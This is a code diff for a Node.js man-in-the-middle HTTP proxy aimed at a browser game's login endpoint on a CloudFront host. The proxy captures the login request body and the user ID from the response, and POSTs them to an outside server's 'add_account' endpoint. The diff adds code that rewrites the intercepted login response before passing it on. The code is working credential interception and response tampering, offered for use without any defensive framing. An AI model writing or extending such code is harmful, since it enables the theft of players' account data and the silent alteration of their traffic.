@@ -6,6 +6,8 @@ const AVL = require('avl');
 const fileAllow = path.join(__dirname, 'allow.json');
 const listAllowProxy = new AVL();
 const isSaveListAllowProxy = false;
+const host = 'https://heoapi.giayuh.com'
+// const host = 'http://127.0.0.1:10002'
 loadList();
 
 /// show lan
@@ -39,27 +41,29 @@ function saveDomain(domain) {
 
 // call add data
 const request = require('request');
-function addRequest(data) {
-  request(
-    'https://heoapi.giayuh.com/adm/add_account', 
-    {
-      method: "POST",
-      json: data
-    }, 
-    (e, d) => {
-      if (e) {
-        console.log(e);
-        return;
+async function addRequest(data) {
+  return new Promise(resolve => {
+    request(
+      host + '/adm/add_account', 
+      {
+        method: "POST",
+        json: data
+      }, 
+      (e, d) => {
+        if (e) {
+          console.log(e);
+          return;
+        }
+        console.log(d.body);
+        resolve(d.body);
       }
-      console.log(d.body);
-    }
-  )
-
+    )
+  });
 }
 
 // add data
 const querystring = require('querystring');
-function addUser(req, res) {
+async function addUser(req, res) {
   const oReq= querystring.parse(req);
   const oRes = JSON.parse(res);
   console.log('capture uid: ', oRes._d.uid);
@@ -68,7 +72,26 @@ function addUser(req, res) {
     uid:  oRes._d.uid,
     data: oReq
   }
-  addRequest(data);
+  return await addRequest(data);
+}
+
+// inject code
+async function injectData(request, reqData, data) {
+  const url = new URL(request.url);
+  if (url.hostname !== 'd2fd20abim5npz.cloudfront.net') {
+    return data;
+  }
+
+  let strData = data.toString('utf-8');
+  switch (url.pathname) {
+    case '/planetpigth/m/gameNew/login/':
+      const res = await addUser(reqData, strData);
+      strData = JSON.parse(strData);
+      strData._d.name = res.msg;
+      return JSON.stringify(strData);
+  }
+
+  return data;
 }
 
 // Proxy
@@ -76,7 +99,7 @@ const httpProxy = require("http-proxy");
 const http = require("http");
 const url = require("url");
 const net = require('net');
-const zlib = require("zlib");
+const { ungzip } = require('node-gzip');
 
 const server = http.createServer(function (req, res) {
   const urlObj = url.parse(req.url);
@@ -86,8 +109,8 @@ const server = http.createServer(function (req, res) {
     saveDomain(urlObj.host);
   } else {
     if (!listAllowProxy.find(urlObj.host)) {
-      // console.log('no', urlObj.host);
-      res.destroy();
+      console.log('no', urlObj.host);
+      req.destroy();
       return;
     }
   }
@@ -98,36 +121,38 @@ const server = http.createServer(function (req, res) {
     res.end();
   });
 
-  const isSniff = req.url === "http://d2fd20abim5npz.cloudfront.net/planetpigth/m/gameNew/login/";
-  if (isSniff) {
-    console.log('sniff');
+  let reqData = [];
 
-    let reqData = [];
+  req.on('data', (chunk) => {
+    reqData.push(chunk);
+  })
+
+  req.on('end', chunk => {
+    reqData = Buffer.concat(reqData).toString();
+  })
+
+  proxy.on('proxyRes', async function(proxyRes, req2, res2) {
     let resData = [];
 
-    req.on('data', (chunk) => {
-      reqData.push(chunk);
-    })
-
-    req.on('end', chunk => {
-      reqData = Buffer.concat(reqData).toString();
-    })
-
-    proxy.on('proxyRes', function(proxyRes, req, res) {
-      const gunzip = zlib.createGunzip();
-      proxyRes.pipe(gunzip);
-
-      gunzip.on('data', function (chunk) {
-          resData.push(chunk);
-      });
-      gunzip.on('end', function () {
-          resData = Buffer.concat(resData).toString();
-          addUser(reqData, resData);
-      });
+    proxyRes.on('data', function (chunk) {
+      resData.push(chunk);
     });
-  } 
 
-  proxy.web(req, res, {target: target});
+    proxyRes.on('end', async function () {
+      const buffer = Buffer.concat(resData);
+      try {
+        const isCompressed = proxyRes.headers['content-encoding'] === 'gzip';
+        const decompressed = isCompressed ? await ungzip(buffer) : buffer;
+        const data = await injectData(req, reqData, decompressed);
+        res2.end(data);
+      } catch (e) {
+        console.log(e);
+        res2.destroy();
+      }
+    });
+  }); 
+
+  proxy.web(req, res, {target: target, selfHandleResponse: true });
 }).listen(10001);
 
 
@@ -155,7 +180,8 @@ server.addListener('connect', function (req, socket, bodyhead) {
     saveDomain(hostDomain);
   } else {
     if (!listAllowProxy.find(hostDomain)) {
-      // console.log('no', hostDomain);
+      console.log('no', hostDomain);
+      req.destroy();
       socket.destroy();
       return;
     }
